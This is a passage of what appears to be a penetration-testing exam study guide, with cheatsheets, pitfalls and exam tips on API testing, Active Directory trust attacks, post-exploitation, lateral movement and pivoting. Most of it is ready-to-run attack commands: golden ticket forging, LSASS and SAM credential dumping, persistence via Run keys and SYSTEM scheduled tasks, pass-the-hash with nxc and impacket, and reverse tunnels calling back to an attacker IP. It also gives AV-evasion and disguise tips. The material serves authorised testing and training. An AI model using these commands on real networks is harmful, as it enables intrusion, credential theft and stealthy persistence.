• Start with documentation discovery. /swagger-ui.html gives every endpoint, method, parameter, and expected response.
  • GraphQL introspection reveals everything in 30 seconds. Query all types with sensitive names (user, admin, payment, key, token).
  • IDOR: create two accounts and test cross-account access — the most reliable confirmation method.
  • Mass assignment: GET the resource to see all fields, include them all in PUT/PATCH with elevated values.
  • Document IDOR by showing request (as account A, requesting account B's resource) and response with B's data.

title: Active Directory Trust Attacks
summary: AD trust attacks enable escalation from a compromised child domain to Enterprise Admin in the parent/root domain. Child-to-parent: use child krbtgt hash to forge an inter-realm TGT with Enterprise Admins SID in ExtraSIDs — bypasses SID Filtering which is disabled by default on child-parent trusts. Cross-forest: if filtering disabled and trusts bidirectional. Unconstrained delegation + coercion: capture DA TGTs. RBCD: configure delegation via GenericWrite on computer objects.
cheatsheet_md:
Trust Enumeration

Get-DomainTrustMapping
Get-ForestTrust

Child-to-Parent Escalation

# DCSync in child domain:
impacket-secretsdump child.corp.local/admin:pass@childdc -just-dc-user krbtgt
# Forge Golden Ticket with Enterprise Admins ExtraSID:
kerberos::golden /user:FakeAdmin /domain:child.corp.local /sid:CHILD_SID /krbtgt:CHILD_HASH /sids:S-1-5-21-ROOT-SID-519 /ptt
# Automated:
impacket-raiseChild child.corp.local/admin:pass -target-exec rootdc.corp.local

Unconstrained Delegation

# Find targets:
Get-DomainComputer -Unconstrained
# Coerce DC auth:
.\SpoolSample.exe dc01.corp.local unconstrained_server.corp.local
# Extract TGT:
Rubeus.exe dump /service:krbtgt /nowrap

Constrained Delegation S4U

Get-DomainUser -TrustedToAuth
Rubeus.exe s4u /user:svc_constrained /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/fileserver.corp.local /ptt
pitfalls_md:
• Assuming SID Filtering always enabled — SID Filtering between same-forest child/parent is often disabled by default. Between separate forests it is usually enabled.
  • Wrong Enterprise Admins SID — Use the ROOT domain's EA SID (S-1-5-21-ROOT-SID-519), not the child domain's. Wrong SID = invalid ticket.
  • Skipping unconstrained delegation enumeration — Any computer with unconstrained delegation is a DA capture point when DA authenticates. BloodHound shows them instantly.
  • Missing RBCD — GenericWrite on computer = configure RBCD = impersonate any user to services on that computer.
  • Not considering Selective Authentication — If enabled on forest trusts, only specific users can cross. Document this limitation.
exam_tips_md:
• Run Get-DomainTrustMapping immediately after gaining DA to see the full trust topology before planning attacks.
  • impacket-raiseChild automates the entire child-to-parent escalation in one command.
  • Unconstrained delegation + SpoolSample/PetitPotam = automated DA TGT capture. Works on DCs too.
  • For ADCS across trusts: certipy works cross-trust if the CA is accessible and templates have cross-forest enrolment.
  • Document trust attacks thoroughly: trust type, technique used, evidence of root domain access achieved.

title: Post-Exploitation and Persistence
summary: Post-exploitation covers situational awareness, credential harvesting, lateral movement preparation, and persistence. Key methods: LSASS dump (comsvcs.dll MiniDump, Mimikatz), SAM/SYSTEM hive extraction, DPAPI blob decryption. Persistence: registry Run keys, scheduled tasks, services, DLL hijacking, WMI subscriptions, COM hijacking. LSASS protection (Credential Guard) blocks Mimikatz on modern Windows — alternatives: pypykatz, comsvcs.dll dump, SAM hive method.
cheatsheet_md:
Situational Awareness

whoami /all
ipconfig /all
netstat -ano
tasklist /v
net user
systeminfo | findstr /i "domain"

LSASS Dump — comsvcs.dll

# Get LSASS PID:
tasklist | findstr lsass
# Dump:
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump [PID] C:\Temp\lsass.dmp full
# Parse on Linux:
pypykatz lsa minidump lsass.dmp

SAM Hive Extraction

reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

Persistence

# Registry Run key:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\evil.exe"
# Scheduled task (SYSTEM):
schtasks /create /tn "WindowsUpdate" /tr "C:\evil.exe" /sc onstart /ru SYSTEM /f
# Service:
sc create "WindowsSvc" binPath= "C:\evil.exe" start= auto

Credential Hunting

cmdkey /list
reg query HKLM /f password /t REG_SZ /s
dir C:\Windows\Panther\Unattend.xml
pitfalls_md:
• Running Mimikatz binary on disk — Fully detected by AV. Run in-memory or use comsvcs.dll dump + pypykatz offline.
  • Not checking for Credential Guard — Mimikatz returns empty. Use SAM/SYSTEM hive method for local hashes.
  • Suspicious persistence names — Use names mimicking legitimate Windows components (WindowsUpdate, SvcHost).
  • Exporting SAM without SYSTEM — SAM alone is useless. Always export both SAM + SYSTEM (and SECURITY for LSA secrets).
  • Missing non-LSASS credential sources — Browser passwords, cmdkey, SSH keys, .env files, application configs are all credential sources.
exam_tips_md:
• comsvcs.dll LSASS dump is the most AV-resilient method. Analyse offline with pypykatz lsa minidump lsass.dmp.
  • After any credential dump: immediately spray all hashes with nxc smb against all discovered hosts.
  • LaZagne.exe all collects from 30+ sources including browsers, email clients, SSH agents, and VPN configs.
  • WMI subscriptions are the most durable and stealthy persistence. Survive reboots and are missed by many autoruns checks.
  • Document persistence: exact mechanism created, name, trigger, action, and cleanup steps performed.

title: Lateral Movement
summary: Lateral movement extends access from one compromised system to additional systems. Primary techniques: Pass-the-Hash (PTH) using NTLM hashes over SMB/WinRM, Pass-the-Ticket (PTT) using Kerberos tickets, Overpass-the-Hash (convert NTLM hash to Kerberos TGT). Tools: nxc (netexec) for bulk auth testing, evil-winrm for WinRM shells, impacket tools (psexec/smbexec/wmiexec/atexec) with different stealth profiles. BloodHound path analysis drives lateral movement strategy.
cheatsheet_md:
Pass-the-Hash

# Bulk auth test:
nxc smb 10.10.10.0/24 -u administrator -H NTLM_HASH
nxc smb targets.txt -u administrator -H NTLM_HASH --local-auth
# WinRM:
evil-winrm -i 10.10.10.5 -u administrator -H NTLM_HASH
# Execution:
impacket-wmiexec -hashes :NTLM administrator@10.10.10.5
impacket-psexec -hashes :NTLM administrator@10.10.10.5

Overpass-the-Hash

Rubeus.exe asktgt /user:svc_backup /rc4:NTLM_HASH /domain:corp.local /dc:dc01 /ptt

nxc Operations

# Execute command:
nxc smb 10.10.10.0/24 -u admin -H NTLM_HASH -x "whoami"
# Dump SAM:
nxc smb 10.10.10.0/24 -u admin -H NTLM_HASH --sam
# Enumerate shares:
nxc smb 10.10.10.0/24 -u user -p pass --shares

Execution Method Stealth

Stealthiest to noisiest:
wmiexec (WMI) < smbexec (temp service) < psexec (PSEXESVC service)
pitfalls_md:
• Using psexec when OPSEC matters — Creates PSEXESVC service (detectable). Use wmiexec or dcom instead.
  • Not testing --local-auth — Domain hashes work on domain hosts. Local admin hashes need --local-auth. Same local admin password across all hosts is common.
  • Missing (Pwn3d!) entries — Always review full nxc output for Pwn3d! indicators.
  • Forgetting Kerberos ticket expiry — TGTs expire after 10 hours. Re-request when lateral movement stops working unexpectedly.
  • PTH on modern Windows RDP — Restricted Admin mode blocks PTH over RDP. Use WinRM or SMB instead.
exam_tips_md:
• nxc smb SUBNET -u user -H hash is the first command after any credential compromise — immediately shows all accessible (Pwn3d!) hosts.
  • BloodHound shortestpath from owned to Domain Admins shows every lateral movement step to execute.
  • wmiexec gives a semi-interactive shell without service creation — adequate for most commands.
  • Track credentials in a spreadsheet: hostname, username, hash/password, access level, pivot path.
  • Kerberoast high-value SPN accounts on every network segment reached — cracked service accounts enable the next pivot.

title: Pivoting and Tunnelling Advanced
summary: Advanced pivoting extends network access through multiple hops. Ligolo-ng is the modern standard — transparent TUN interface (no proxychains needed). Chisel provides HTTP-based tunnelling bypassing firewall egress rules. SSH dynamic port forwarding creates SOCKS5. Double pivoting chains two tunnels for a third segment. DNS tunnelling (dnscat2) bypasses restrictive firewalls allowing only DNS. Common use cases: reaching internal web apps, AD, databases, and scanning through a compromised host.
cheatsheet_md:
Ligolo-ng Setup

# Attacker:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# Pivot host:
.\agent.exe -connect 10.10.14.5:11601 -ignore-cert
# Proxy console: session -> tunnel_start -> start
sudo ip route add 10.10.10.0/24 dev ligolo

Chisel Reverse SOCKS5

# Attacker:
./chisel server -p 8080 --reverse
# Pivot:
.\chisel.exe client 10.10.14.5:8080 R:socks
# proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.10.50

SSH Tunnelling

# Dynamic SOCKS proxy:
ssh -D 9050 -N user@pivot_host
# Local port forward:
ssh -L 8080:192.168.1.100:80 user@pivot_host -N
# Remote forward:
ssh -R 4444:127.0.0.1:4444 user@pivot_host
pitfalls_md:
• proxychains with UDP scanning — proxychains is TCP only. Use nmap -sT -Pn for proxy/tunnel-based scanning.
  • Not adding routes in Ligolo — sudo ip route add SUBNET dev ligolo is required after starting the tunnel.
  • Wrong architecture agent — Upload the correct x64/x86 agent for the pivot host architecture.
  • DNS not resolving through tunnel — Add internal DNS server to /etc/resolv.conf or add /etc/hosts entries.
  • Not testing connectivity before scanning — Verify with proxychains curl before running bulk scans through the pivot.
exam_tips_md:
• Ligolo-ng is preferred for exam — transparent TUN means all tools work natively without proxychains.
  • Have x64 and x86 agent builds ready — you won't always know the target architecture beforehand.
  • Keep a pivot diagram: Attacker -> [tool:port] -> Pivot1 -> Pivot2 -> Target. This becomes your network diagram in the report.
  • Chisel SOCKS: add 'socks5 127.0.0.1 1080' to proxychains4.conf replacing existing socks4 entry. Use proxychains4 -q to suppress verbose output.
  • Use port 80/443 for Chisel/Ligolo to blend with allowed egress traffic through restrictive firewalls.

title: Data Exfiltration
summary: Data exfiltration demonstrates that sensitive data is accessible and transferrable. Methodology: identify sensitive data (PII, credentials, IP), plan exfiltration route (HTTP, DNS, ICMP based on egress filtering), and document access without causing actual data breach.
